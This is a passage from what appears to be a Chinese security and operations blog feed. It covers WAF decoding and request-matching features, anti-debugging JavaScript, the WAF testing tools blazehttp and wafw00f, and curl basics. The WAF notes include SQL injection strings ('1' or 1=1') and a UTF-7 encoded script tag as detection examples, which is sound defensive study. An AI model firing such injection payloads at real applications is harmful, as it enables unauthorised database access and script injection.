class="hljs-tag">&lt;<span class="hljs-name">logo</span>&gt;</span>runoob-logo.png<span class="hljs-tag">&lt;/<span class="hljs-name">logo</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">desc</span>&gt;</span>1&#x27;or &#x27;1&#x27;=&#x27;1<span class="hljs-tag">&lt;/<span class="hljs-name">desc</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">site</span>&gt;</span><br>解码输出 (4 payloads):<br><br>RUNOOB<br>https://www.runoob.com<br>runoob-logo.png<br>1&#x27;or&#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure><h3 id="PHP-序列化对象解析"><a href="#PHP-序列化对象解析" class="headerlink" title="PHP 序列化对象解析"></a>PHP 序列化对象解析</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;1&#x27; or 1=1&quot;</span>; php 序列化对象解析后是 <span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="UTF7解码"><a href="#UTF7解码" class="headerlink" title="UTF7解码"></a>UTF7解码</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>B\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>F\<span class="hljs-keyword">x</span><span class="hljs-number">76</span>\<span class="hljs-keyword">x</span><span class="hljs-number">38</span>+ADw-script+AD<span class="hljs-number">4</span>- UTF<span class="hljs-number">7</span>解码后是 &lt;script&gt;<br></code></pre></td></tr></table></figure><h2 id="请求特征"><a href="#请求特征" class="headerlink" title="请求特征"></a>请求特征</h2><h3 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h3><p>请求原始URI，未解码</p><h3 id="解码后路径"><a href="#解码后路径" class="headerlink" title="解码后路径"></a>解码后路径</h3><p>用户请求中从&#x2F;开始到?结束的部分，并进行一次 URL 解码，如 &#x2F;query news</p><h3 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h3><p>用户请求的 URL 中从?开始到最后的部分，并进行一次 URL 解码，如 q-1 or 1-1</p><h3 id="GET-参数"><a href="#GET-参数" class="headerlink" title="GET 参数"></a>GET 参数</h3><p>用户请求的 URL 中从?开始到最后的部分，拆分为键值对形式后进行一次 URL 解码，如 参数名q参数值1or 1&#x3D;1</p><h3 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h3><p>HTTP 请求的 Method，如 GET、POST</p><h3 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h3><p>HTTP 请求头中的 Host</p><h3 id="完整-Cookie"><a href="#完整-Cookie" class="headerlink" title="完整 Cookie"></a>完整 Cookie</h3><p>未拆分为键值对形式的 Cookie</p><h3 id="Cookis-参数"><a href="#Cookis-参数" class="headerlink" title="Cookis 参数"></a>Cookis 参数</h3><p>拆分为键值对形式的 Cookie</p><h3 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User Agent"></a>User Agent</h3><p>HTTP 请求头中的 User-Agent</p><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p>HTTP 请求头中的 Referer</p><h3 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h3><p>HTTP 请求头中的 Content-Type</p><h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h3><p>HTTP 请求头中的Content-Length</p><h3 id="用户IP"><a href="#用户IP" class="headerlink" title="用户IP"></a>用户IP</h3><p>用户的客户端源 IP</p><h3 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For"></a>X-Forwarded-For</h3><p>HTTP 请求头中的X-Forwarded-For</p><h3 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h3><p>HTTP 请求头中的 Origin</p><h3 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h3><p>HTTP 请求头中的 Accept-Language</p><h3 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h3><p>HTTP 请求头中的 Authorization</p><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>用户的 Session 内容(需要先配置 Session 获取方式)</p><h3 id="完整-HTTP-header"><a href="#完整-HTTP-header" class="headerlink" title="完整 HTTP header"></a>完整 HTTP header</h3><p>原始 HTTP 完整请求头</p><h3 id="HTTP-请求头"><a href="#HTTP-请求头" class="headerlink" title="HTTP 请求头"></a>HTTP 请求头</h3><p>拆分为键值对形式 HTTP 请求头</p><h3 id="HTTP-请求头长度"><a href="#HTTP-请求头长度" class="headerlink" title="HTTP 请求头长度"></a>HTTP 请求头长度</h3><p>HTTP 请求头的长度</p><h3 id="HTTP-请求体长度"><a href="#HTTP-请求体长度" class="headerlink" title="HTTP 请求体长度"></a>HTTP 请求体长度</h3><p>HTTP 完整 body 的长度</p><h3 id="POST-参数"><a href="#POST-参数" class="headerlink" title="POST 参数"></a>POST 参数</h3><p>HTTP 请求 Body 中 form 类数据，拆分为键值对形式后进行一次 URL 解码</p><h3 id="请求体中任意-key-长度"><a href="#请求体中任意-key-长度" class="headerlink" title="请求体中任意 key 长度"></a>请求体中任意 key 长度</h3><p>HTTP 请求 Body 中 form 类数据中的任意 key 长度</p><h3 id="请求体中任意-val-长度"><a href="#请求体中任意-val-长度" class="headerlink" title="请求体中任意 val 长度"></a>请求体中任意 val 长度</h3><p>HTTP 请求 Body 中 form 类数据中的任意 val 长度</p><h3 id="请求体中-key-数量"><a href="#请求体中-key-数量" class="headerlink" title="请求体中 key 数量"></a>请求体中 key 数量</h3><p>HTTP 请求 Body 中 form 类数据中的 key 数量</p><h3 id="完整-Body"><a href="#完整-Body" class="headerlink" title="完整 Body"></a>完整 Body</h3><p>完整的 HTTP 请求的 Body</p><h3 id="上传的文件名"><a href="#上传的文件名" class="headerlink" title="上传的文件名"></a>上传的文件名</h3><p>Content-Type 为 multipart&#x2F;form-data 或 multipart&#x2F;related 的 HTTP 请求 Body 中的文件名</p><h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><p>服务端返回的 HTTP 状态码</p><h3 id="HTTP响应头"><a href="#HTTP响应头" class="headerlink" title="HTTP响应头"></a>HTTP响应头</h3><p>拆分为键值对形式 HTTP 响应头</p><h3 id="完整-HTTP-响应头"><a href="#完整-HTTP-响应头" class="headerlink" title="完整 HTTP 响应头"></a>完整 HTTP 响应头</h3><p>原始 HTTP 完整响应头</p><h3 id="响应内容"><a href="#响应内容" class="headerlink" title="响应内容"></a>响应内容</h3><p>服务端返回的完整响应内容</p><h2 id="匹配模式"><a href="#匹配模式" class="headerlink" title="匹配模式"></a>匹配模式</h2><p>包含<br>不包含<br>等于<br>不等于<br>正则匹配<br>正则不匹配</p><h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h3 id="限制访问频率"><a href="#限制访问频率" class="headerlink" title="限制访问频率"></a>限制访问频率</h3><p>对请求源访问行为（单URL、多URL和所有URL）进行分析统计，从IP、Session和用户指纹维度进行限制（访问频率限制或访问封禁），自定义频率拦截状态码和页面。</p><h3 id="请求验证"><a href="#请求验证" class="headerlink" title="请求验证"></a>请求验证</h3><p>对请求源访问行为（单URL、多URL和所有URL）进行匹配，</p><p>1、JS挑战</p><p>2、滑块</p><p>3、严格滑块</p><h4 id="验证码验证"><a href="#验证码验证" class="headerlink" title="验证码验证"></a>验证码验证</h4><p>算式验证码、字符验证码、滑动验证</p><h4 id="浏览器验证"><a href="#浏览器验证" class="headerlink" title="浏览器验证"></a>浏览器验证</h4><p>功能</p><p>1、主动发现风险接口</p><p>2、数据脱敏</p><p>对响应报文作出修改，例如业务将敏感数据打码或拦截等</p><p>3、防御0day攻击</p><p>限制频率黑名单</p><p>​1、黑名单</p><p>​维度：IP&#x2F;session&#x2F;用户指纹？</p><p>​黑名单的上限和什么有关系？CPU？磁盘？</p><p>​黑名单超过上限后，对防御的影响？</p><p>​黑名单如何扩容？</p><p>​</p><p>​2、频率触发策略实际生效地址：检测&#x2F;管理？</p><p>​3、白名单</p><p>​维度：IP&#x2F;session&#x2F;用户指纹？</p><p>​白名单的上限和什么有关系？CPU？磁盘？</p><p>​白名单超过上限后，对防御的影响？</p><p>​白名单如何扩容？</p><h2 id="主动防护策略"><a href="#主动防护策略" class="headerlink" title="主动防护策略"></a>主动防护策略</h2><h3 id="页面防调试"><a href="#页面防调试" class="headerlink" title="页面防调试"></a>页面防调试</h3><h4 id="技术实现方式"><a href="#技术实现方式" class="headerlink" title="技术实现方式"></a>技术实现方式</h4><h5 id="禁用开发者工具"><a href="#禁用开发者工具" class="headerlink" title="禁用开发者工具"></a><strong>禁用开发者工具</strong></h5><p>通过监听键盘事件或鼠标右键事件，阻止用户打开开发者工具。</p><h6 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a>实现代码：</h6><p>javascript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 禁用右键菜单</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;contextmenu&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>  e.<span class="hljs-title function_">preventDefault</span>();<br>&#125;);<br><br><span class="hljs-comment">// 禁用 F12、Ctrl+Shift+I、Ctrl+U 等快捷键</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;keydown&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">&#x27;F12&#x27;</span> || (e.<span class="hljs-property">ctrlKey</span> &amp;&amp; e.<span class="hljs-property">shiftKey</span> &amp;&amp; e.<span class="hljs-property">key</span> === <span class="hljs-string">&#x27;I&#x27;</span>) || (e.<span class="hljs-property">ctrlKey</span> &amp;&amp; e.<span class="hljs-property">key</span> === <span class="hljs-string">&#x27;U&#x27;</span>)) &#123;<br>    e.<span class="hljs-title function_">preventDefault</span>();<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h6 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h6><ul><li>用户可以通过浏览器设置或扩展程序绕过限制。</li><li>无法完全阻止开发者工具的打开。</li></ul><h5 id="检测开发者工具"><a href="#检测开发者工具" class="headerlink" title="检测开发者工具"></a>检测开发者工具</h5><p>通过检测开发者工具是否打开，动态修改页面行为或阻止调试。</p><h6 id="实现代码：-1"><a href="#实现代码：-1" class="headerlink" title="实现代码："></a>实现代码：</h6><p>javascript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript">(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">devToolsOpened</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> threshold = <span class="hljs-number">160</span>; <span class="hljs-comment">// 窗口宽度或高度的差值阈值</span><br>    <span class="hljs-keyword">const</span> widthThreshold = <span class="hljs-variable language_">window</span>.<span class="hljs-property">outerWidth</span> - <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> &gt; threshold;<br>    <span class="hljs-keyword">const</span> heightThreshold = <span class="hljs-variable language_">window</span>.<span class="hljs-property">outerHeight</span> - <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span> &gt; threshold;<br>    <span class="hljs-keyword">return</span> widthThreshold || heightThreshold;<br>  &#125;;<br><br>  <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">devToolsOpened</span>()) &#123;<br>      <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;开发者工具已打开，请关闭后继续使用！&#x27;</span>);<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">reload</span>(); <span class="hljs-comment">// 刷新页面</span><br>    &#125;<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;)();<br></code></pre></td></tr></table></figure><h6 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h6><ul><li>开发者工具打开时，浏览器窗口的 <code>outerWidth</code> 和 <code>innerWidth</code> 会有明显差异。</li><li>通过检测这种差异，判断开发者工具是否打开。</li></ul><h6 id="缺点：-1"><a href="#缺点：-1" class="headerlink" title="缺点："></a>缺点：</h6><ul><li>用户可以通过禁用 JavaScript 或修改浏览器设置绕过检测。</li><li>部分浏览器可能不支持此方法。</li></ul>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>waf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>waf_tools</title>
    <link href="/2024/03/15/security/netsec/waf/waf_tools/"/>
    <url>/2024/03/15/security/netsec/waf/waf_tools/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>测试waf时，需要对waf产品进行性能测试，除了手工模拟攻击测试外，可以使用开源WAF测试工具自动化进行深度测试。</p><h1 id="chaitin-blazehttp"><a href="#chaitin-blazehttp" class="headerlink" title="chaitin&#x2F;blazehttp"></a>chaitin&#x2F;blazehttp</h1><h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><p><a href="https://github.com/chaitin/blazehttp">https://github.com/chaitin/blazehttp</a></p><h2 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="下载相关安装包"><a href="#下载相关安装包" class="headerlink" title="下载相关安装包"></a>下载相关安装包</h4><p><a href="https://github.com/chaitin/blazehttp">https://github.com/chaitin/blazehttp</a></p><h4 id="GUI版本直接打开即可"><a href="#GUI版本直接打开即可" class="headerlink" title="GUI版本直接打开即可"></a>GUI版本直接打开即可</h4><p><img src="/image-20250102165306403.png" alt="image-20250102165306403"></p><h2 id="测试效果"><a href="#测试效果" class="headerlink" title="测试效果"></a>测试效果</h2><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><p>【1】blazehttp </p><p><a href="https://github.com/chaitin/blazehttp">https://github.com/chaitin/blazehttp</a></p><h1 id="wafw00f"><a href="#wafw00f" class="headerlink" title="wafw00f"></a>wafw00f</h1><h2 id="工具安装-1"><a href="#工具安装-1" class="headerlink" title="工具安装"></a>工具安装</h2><h3 id="Install-from-PyPI-recommended"><a href="#Install-from-PyPI-recommended" class="headerlink" title="Install from PyPI (recommended)"></a>Install from PyPI (recommended)</h3><p>python3 -m pip install wafw00f</p><p>or</p><p>pip3 install wafw00f</p><h3 id="Via-Docker"><a href="#Via-Docker" class="headerlink" title="Via Docker"></a>Via Docker</h3><p>It is also possible to run it within a docker container. Clone this repository first and build the Docker image using:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  security git <span class="hljs-built_in">clone</span> https://github.com/EnableSecurity/wafw00f.git<br>正克隆到 <span class="hljs-string">&#x27;wafw00f&#x27;</span>...<br>remote: Enumerating objects: 5021, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (1097/1097), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (265/265), <span class="hljs-keyword">done</span>.<br>remote: Total 5021 (delta 917), reused 832 (delta 832), pack-reused 3924 (from 3)<br>接收对象中: 100% (5021/5021), 807.80 KiB | 1.03 MiB/s, 完成.<br>处理 delta 中: 100% (3662/3662), 完成.<br></code></pre></td></tr></table></figure><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">docker build . -<span class="hljs-built_in">t</span> wafw00f<br></code></pre></td></tr></table></figure><p>报错信息</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livescript">[+] Building <span class="hljs-number">75.8s</span> (<span class="hljs-number">3</span>/<span class="hljs-number">3</span>) FINISHED                                                                                 <br> =&gt; [internal] load build definition <span class="hljs-keyword">from</span> Dockerfile                                                         <span class="hljs-number">0.0s</span><br> =&gt; =&gt; transferring dockerfile: <span class="hljs-number">457</span>B                                                                         <span class="hljs-number">0.0s</span><br> =&gt; [internal] load .dockerignore                                                                            <span class="hljs-number">0.0s</span><br> =&gt; =&gt; transferring context: <span class="hljs-number">2</span>B                                                                              <span class="hljs-number">0.0s</span><br> =&gt; ERROR [internal] load metadata <span class="hljs-keyword">for</span> docker.io/library/python:<span class="hljs-number">3.11</span>.<span class="hljs-number">9</span>-alpine                               <span class="hljs-number">75.7s</span><br>------<br> &gt; [internal] load metadata <span class="hljs-keyword">for</span> docker.io/library/python:<span class="hljs-number">3.11</span>.<span class="hljs-number">9</span>-alpine:<br>------<br>failed <span class="hljs-keyword">to</span> solve <span class="hljs-keyword">with</span> frontend dockerfile.v0: failed <span class="hljs-keyword">to</span> create LLB definition: pull access denied, repository does <span class="hljs-keyword">not</span> exist <span class="hljs-keyword">or</span> may <span class="hljs-built_in">require</span> authorization: server message: insufficient_scope: authorization failed<br></code></pre></td></tr></table></figure><p>docker login 登录</p><p>Now you can run:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> --<span class="hljs-built_in">rm</span> -it wafw00f https://example.com</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>waf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>curl_base</title>
    <link href="/2024/03/15/yunwei/applications/curl/curl_base/"/>
    <url>/2024/03/15/yunwei/applications/curl/curl_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>curl 是一个免费的开源工具，用于从或向服务器传输数据。它支持多种操作系统，如 Windows、Ubuntu、RHEL、CentOS、Fedora 和 OpenSUSE。</p><h2 id="功能提供"><a href="#功能提供" class="headerlink" title="功能提供"></a>功能提供</h2><p>curl 所有的传输功能均为 libcurl 库提供</p><h2 id="语法参数"><a href="#语法参数" class="headerlink" title="语法参数"></a>语法参数</h2><h3 id="–insecure"><a href="#–insecure" class="headerlink" title="–insecure"></a>–insecure</h3><p>忽略HTTPS证书校验</p><h3 id="v"><a href="#v" class="headerlink" title="-v"></a>-v</h3><p>显示完整通信过程，端口连接，request请求</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs gams">root@iZbp1191gh7vw52537lyxrZ:~# curl https:<span class="hljs-comment">//10000hours.github.io -v</span><br><span class="hljs-comment">*   Trying 185.199.108.153:443...</span><br><span class="hljs-comment">*   Trying 2606:50c0:8000::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8000::153: Network is unreachable</span><br><span class="hljs-comment">*   Trying 2606:50c0:8003::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8003::153: Network is unreachable</span><br><span class="hljs-comment">*   Trying 2606:50c0:8002::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8002::153: Network is unreachable</span><br><span class="hljs-comment">*   Trying 2606:50c0:8001::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8001::153: Network is unreachable</span><br><span class="hljs-comment">* Connected to 10000hours.github.io (185.199.108.153) port 443 (#0)</span><br><span class="hljs-comment">* ALPN, offering h2</span><br><span class="hljs-comment">* ALPN, offering http/1.1</span><br><span class="hljs-comment">*  CAfile: /etc/ssl/certs/ca-certificates.crt</span><br><span class="hljs-comment">*  CApath: /etc/ssl/certs</span><br><span class="hljs-comment">* TLSv1.0 (OUT), TLS header, Certificate Status (22):</span><br><span class="hljs-comment">* TLSv1.3 (OUT), TLS handshake, Client hello (1):</span><br><span class="hljs-comment">* TLSv1.2 (IN), TLS header, Certificate Status (22):</span><br></code></pre></td></tr></table></figure><h3 id="H"><a href="#H" class="headerlink" title="-H"></a>-H</h3><p>设置请求header</p><p>-H “X-Stream-Protocol-Version: <a href="http://v2.channel.k8s.io/">v2.channel.k8s.io</a>“</p><h3 id="X"><a href="#X" class="headerlink" title="-X"></a>-X</h3><p>指定协议，默认GET</p><p>-X POST</p><h3 id="d"><a href="#d" class="headerlink" title="-d"></a>-d</h3><p>指定参数 -d ‘key&#x3D;value’，多个参数，多个-d</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl <span class="hljs-punctuation">-</span>d <span class="hljs-string">&quot;name=curl&quot;</span> https<span class="hljs-punctuation">:</span><span class="hljs-comment">//example.com</span><br>curl <span class="hljs-punctuation">-</span>d <span class="hljs-string">&quot;name=curl&quot;</span> <span class="hljs-punctuation">-</span>d <span class="hljs-string">&quot;tool=cmdline&quot;</span> https<span class="hljs-punctuation">:</span><span class="hljs-comment">//example.com</span><br></code></pre></td></tr></table></figure><h3 id="G"><a href="#G" class="headerlink" title="-G"></a>-G</h3><p>指定发送GET请求</p><h3 id="k"><a href="#k" class="headerlink" title="-k"></a>-k</h3><p>忽略HTTPS证书校验</p><h3 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h3><p>静默模式，不输出任何信息</p><h3 id="S"><a href="#S" class="headerlink" title="-S"></a>-S</h3><p>显示错误信息</p><h3 id="L"><a href="#L" class="headerlink" title="-L"></a>-L</h3><p>跟随重定向</p><h3 id="e"><a href="#e" class="headerlink" title="-e"></a>-e</h3><p>设置referer</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl <span class="hljs-punctuation">-</span>e <span class="hljs-string">&quot;https://example.com&quot;</span> http<span class="hljs-punctuation">:</span><span class="hljs-comment">//www.example.com</span><br></code></pre></td></tr></table></figure><h2 id="支持的协议"><a href="#支持的协议" class="headerlink" title="支持的协议"></a>支持的协议</h2><h3 id="DICT"><a href="#DICT" class="headerlink" title="DICT"></a>DICT</h3><p>Lets you lookup words using online dictionaries.</p><p>允许您使用在线词典查找单词。</p><h3 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a>FILE</h3><p>Read or write local files. curl does not support accessing file:&#x2F;&#x2F; URL remotely, but when running on Microsoft Windows using the native UNC approach will work.</p><p>读取或写入本地文件。curl不支持远程访问file:&#x2F;&#x2F; URL，但在Microsoft Windows上运行时，使用本机UNC方法可以工作。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># curl file:///root/1.txt</span><br><span class="hljs-number">111111</span><br></code></pre></td></tr></table></figure><h3 id="FTP-FTPS"><a href="#FTP-FTPS" class="headerlink" title="FTP FTPS"></a>FTP FTPS</h3><p>curl supports the File Transfer Protocol with a lot of tweaks and levers. With or without using TLS.</p><p>curl支持使用文件传输协议，并具有许多调整和杠杆作用。无论是否使用TLS，都可以使用它。</p><h4 id="从FTP服务器下载文件"><a href="#从FTP服务器下载文件" class="headerlink" title="从FTP服务器下载文件"></a>从FTP服务器下载文件</h4><p>curl <a href="ftp://username/">ftp://username</a>:<a href="http://mailto:password@ftp.example.com/">password@ftp.example.com</a>&#x2F;download&#x2F;file.txt -o local_file.txt</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">➜  /tmp curl <span class="hljs-symbol">ftp:</span>//<span class="hljs-symbol">hot:</span><span class="hljs-number">123456</span><span class="hljs-variable">@10</span>.<span class="hljs-number">2.2</span>.<span class="hljs-number">2</span>/hotcal.tar.gz -o local_file.txt<br>  % <span class="hljs-title class_">Total</span>    % <span class="hljs-title class_">Received</span> % <span class="hljs-title class_">Xferd</span>  <span class="hljs-title class_">Average</span> <span class="hljs-title class_">Speed</span>   <span class="hljs-title class_">Time</span>    <span class="hljs-title class_">Time</span>     <span class="hljs-title class_">Time</span>  <span class="hljs-title class_">Current</span><br>                                 <span class="hljs-title class_">Dload</span>  <span class="hljs-title class_">Upload</span>   <span class="hljs-title class_">Total</span>   <span class="hljs-title class_">Spent</span>    <span class="hljs-title class_">Left</span>  <span class="hljs-title class_">Speed</span><br><span class="hljs-number">100</span> <span class="hljs-number">95172</span>  <span class="hljs-number">100</span> <span class="hljs-number">95172</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>   <span class="hljs-number">484</span>k      <span class="hljs-number">0</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span>  <span class="hljs-number">491</span>k<br><br>➜  /tmp ls -la local_file.txt<br>-rw-r--r--  <span class="hljs-number">1</span> admin  wheel  <span class="hljs-number">95172</span> <span class="hljs-number">10</span> <span class="hljs-number">11</span> <span class="hljs-number">17</span><span class="hljs-symbol">:</span><span class="hljs-number">43</span> local_file.txt<br></code></pre></td></tr></table></figure><h4 id="上传文件到FTP服务器"><a href="#上传文件到FTP服务器" class="headerlink" title="上传文件到FTP服务器"></a>上传文件到FTP服务器</h4><p>curl -T “file.txt” <a href="ftp://username/">ftp://username</a>:<a href="http://mailto:password@ftp.example.com/">password@ftp.example.com</a>&#x2F;upload&#x2F;</p><h4 id="被动模式进行FTP传输"><a href="#被动模式进行FTP传输" class="headerlink" title="被动模式进行FTP传输"></a>被动模式进行FTP传输</h4><p>被动模式用于解决某些情况下，主动模式失败的情况</p><p>curl -e “<a href="ftp://ftp.example.com/">ftp://ftp.example.com</a>“ <a href="ftp://username/">ftp://username</a>:<a href="http://mailto:password@ftp.example.com/">password@ftp.example.com</a>&#x2F;download&#x2F;file.txt -o local_file.txt</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">➜  /tmp curl -e <span class="hljs-string">&quot;ftp://10.2.2.2&quot;</span> <span class="hljs-symbol">ftp:</span>//<span class="hljs-symbol">hot:</span><span class="hljs-number">123456</span><span class="hljs-variable">@10</span>.<span class="hljs-number">2.2</span>.<span class="hljs-number">2</span>/hotcal.tar.gz -o local_file.txt <br>  % <span class="hljs-title class_">Total</span>    % <span class="hljs-title class_">Received</span> % <span class="hljs-title class_">Xferd</span>  <span class="hljs-title class_">Average</span> <span class="hljs-title class_">Speed</span>   <span class="hljs-title class_">Time</span>    <span class="hljs-title class_">Time</span>     <span class="hljs-title class_">Time</span>  <span class="hljs-title class_">Current</span><br>                                 <span class="hljs-title class_">Dload</span>  <span class="hljs-title class_">Upload</span>   <span class="hljs-title class_">Total</span>   <span class="hljs-title class_">Spent</span>    <span class="hljs-title class_">Left</span>  <span class="hljs-title class_">Speed</span><br><span class="hljs-number">100</span> <span class="hljs-number">95172</span>  <span class="hljs-number">100</span> <span class="hljs-number">95172</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>   <span class="hljs-number">518</span>k      <span class="hljs-number">0</span> --<span 